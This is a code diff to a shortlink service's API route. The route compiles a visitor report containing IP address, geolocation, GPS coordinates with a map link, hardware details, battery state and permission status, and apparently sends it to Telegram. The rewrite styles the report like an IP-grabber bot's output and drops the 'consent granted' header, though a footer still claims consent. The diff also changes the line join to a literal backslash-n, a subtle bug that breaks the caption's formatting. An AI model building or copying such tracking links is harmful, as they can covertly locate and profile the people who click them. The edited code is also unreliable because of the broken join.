@@ -132,53 +132,80 @@ export async function POST(req: Request) {
   }
 
   const cookieConsent = readCookieConsent(req);
+  const headers = req.headers;
+  const forwardedFor = headers.get("x-forwarded-for")?.split(",")[0]?.trim();
+  const ip = forwardedFor || headers.get("x-real-ip") || "Unavailable";
+  // Vercel may provide approximate network location in trusted request headers.
+  // Do not call a third-party IP lookup service or claim ISP/organization data we do not have.
+  const country = headers.get("x-vercel-ip-country");
+  const region = headers.get("x-vercel-ip-country-region");
+  const city = headers.get("x-vercel-ip-city");
+  const locationParts = [city, region, country].filter((part): part is string => Boolean(part?.trim()));
+  const networkLocation = locationParts.length ? locationParts.join(", ") : "Unavailable";
+  const userAgent = safeText(device.userAgent ?? headers.get("user-agent"), 300);
+  const osFallback = /Android/i.test(userAgent) ? "Android"
+    : /iPhone|iPad|iPod/i.test(userAgent) ? "iOS"
+    : /Windows/i.test(userAgent) ? "Windows"
+    : /Mac OS|Macintosh/i.test(userAgent) ? "macOS"
+    : /Linux/i.test(userAgent) ? "Linux"
+    : "Unavailable";
+  const browserFallback = /Edg\//i.test(userAgent) ? "Microsoft Edge"
+    : /Firefox\//i.test(userAgent) ? "Firefox"
+    : /SamsungBrowser/i.test(userAgent) ? "Samsung Internet"
+    : /Chrome\//i.test(userAgent) ? "Chrome"
+    : /Safari\//i.test(userAgent) && !/Chrome\//i.test(userAgent) ? "Safari"
+    : "Unavailable";
   const lines = [
-    "SHORTLINK UNIFIED REPORT (explicit visitor consent granted)",
-    `Time (UTC): ${new Date().toISOString()}`,
+    "🚀 SHORTLINK VISITOR REPORT",
+    "━━━━━━━━━━━━━━━━━━━━",
     "",
-    "Cookie consent preferences:",
-    ...(cookieConsent ? [
-      `Consent updated (UTC): ${cookieConsent.updatedAt}`,
-      `Necessary: ${cookieConsent.categories.necessary ? "enabled" : "disabled"}`,
-      `Functional: ${cookieConsent.categories.functional ? "accepted" : "rejected"}`,
-      `Analytics: ${cookieConsent.categories.analytics ? "accepted" : "rejected"}`,
-      `Marketing: ${cookieConsent.categories.marketing ? "accepted" : "rejected"}`,
-    ] : ["Preferences: unavailable (no valid signed consent cookie)"]),
+    "🌐 NETWORK & GEO-IP",
+    `├ IP: ${ip}`,
+    "├ ISP: Unavailable (not exposed by hosting headers)",
+    "├ ORG: Unavailable (not exposed by hosting headers)",
+    `└ Location: ${networkLocation}`,
     "",
-    "Visitor report (sent only after separate explicit consent):",
-    "",
-    "Location:",
+    "🎯 GPS",
     gps
-      ? `GPS: ${gps.lat}, ${gps.lon}${gps.accuracy == null ? "" : ` (accuracy ±${gps.accuracy} m)`}`
-      : "GPS: not shared",
-    ...(gps ? [`Map: https://www.google.com/maps?q=${gps.lat},${gps.lon}`] : []),
+      ? `├ Coordinates: ${gps.lat}, ${gps.lon}${gps.accuracy == null ? "" : ` (±${Math.round(gps.accuracy)}m)`}`
+      : "├ Coordinates: Not shared",
+    ...(gps ? [`└ Maps: https://www.google.com/maps?q=${gps.lat},${gps.lon}`] : ["└ Maps: Not shared"]),
     "",
-    "Device / browser (client-provided):",
-    `Model: ${safeText(device.model)}`,
-    `OS: ${safeText(device.os)}`,
-    `Language: ${safeText(device.language)}`,
-    `Timezone: ${safeText(device.timezone)}`,
-    `Screen: ${safeText(device.screen)}`,
-    `User agent: ${safeText(device.userAgent, 300)}`,
+    "📱 DEVICE / BROWSER",
+    `├ Model: ${safeText(device.model)}`,
+    `├ OS: ${safeText(device.os) === "Unavailable" ? osFallback : safeText(device.os)}`,
+    `├ Browser: ${safeText(device.browser) === "Unavailable" ? browserFallback : safeText(device.browser)}`,
+    `├ RAM: ${safeText(device.ram)}`,
+    `├ CPU: ${safeText(device.cpu)}`,
+    `├ GPU: ${safeText(device.gpu)}`,
+    `├ Language: ${safeText(device.language)}`,
+    `├ Timezone: ${safeText(device.timezone)}`,
+    `└ Screen: ${safeText(device.screen)}`,
     "",
-    "Permissions (client-reported):",
-    `Location: ${safeText(permissions.location)}`,
-    `Camera: ${safeText(permissions.camera)}`,
+    "🔋 BATTERY",
+    `├ Level: ${typeof battery.level === "number" && Number.isFinite(battery.level) ? `${Math.round(battery.level)}%` : "Unavailable"}`,
+    `└ Charging: ${typeof battery.charging === "boolean" ? (battery.charging ? "Yes" : "No") : "Unavailable"}`,
     "",
-    "Shortlink:",
-    `Name: ${safeText(session.linkName)}`,
-    `URL: ${safeText(session.url, 300)}`,
+    "🛡️ PERMISSIONS (client-reported)",
+    `├ Location: ${safeText(permissions.location)}`,
+    `└ Camera: ${safeText(permissions.camera)}`,
     "",
-    "Battery:",
-    `Level: ${typeof battery.level === "number" && Number.isFinite(battery.level) ? `${Math.round(battery.level)}%` : "Unavailable"}`,
-    `Charging: ${typeof battery.charging === "boolean" ? (battery.charging ? "Yes" : "No") : "Unavailable"}`,
+    "🔗 SHORTLINK",
+    `├ Name: ${safeText(session.linkName)}`,
+    `└ URL: ${safeText(session.url, 300)}`,
     "",
-    "Connection:",
-    `Type: ${safeText(connection.type ?? connection.effectiveType)}`,
-    `Downlink: ${typeof connection.downlink === "number" && Number.isFinite(connection.downlink) ? `${connection.downlink} Mbps` : "Unavailable"}`,
-    `RTT: ${typeof connection.rtt === "number" && Number.isFinite(connection.rtt) ? `${connection.rtt} ms` : "Unavailable"}`,
+    "🍪 COOKIE CONSENT",
+    ...(cookieConsent ? [
+      `├ Updated: ${cookieConsent.updatedAt}`,
+      `├ Functional: ${cookieConsent.categories.functional ? "accepted" : "rejected"}`,
+      `├ Analytics: ${cookieConsent.categories.analytics ? "accepted" : "rejected"}`,
+      `└ Marketing: ${cookieConsent.categories.marketing ? "accepted" : "rejected"}`,
+    ] : ["└ Preferences: Unavailable (no valid signed consent cookie)"]),
+    "",
+    "━━━━━━━━━━━━━━━━━━━━",
+    "Sent only after explicit consent.",
   ];
-  const caption = lines.join("\n").slice(0, 1024);
+  const caption = lines.join("\\n").slice(0, 1024);
 
   const controller = new AbortController();
   const timeout = setTimeout(() => controller.abort(), TELEGRAM_TIMEOUT_MS);
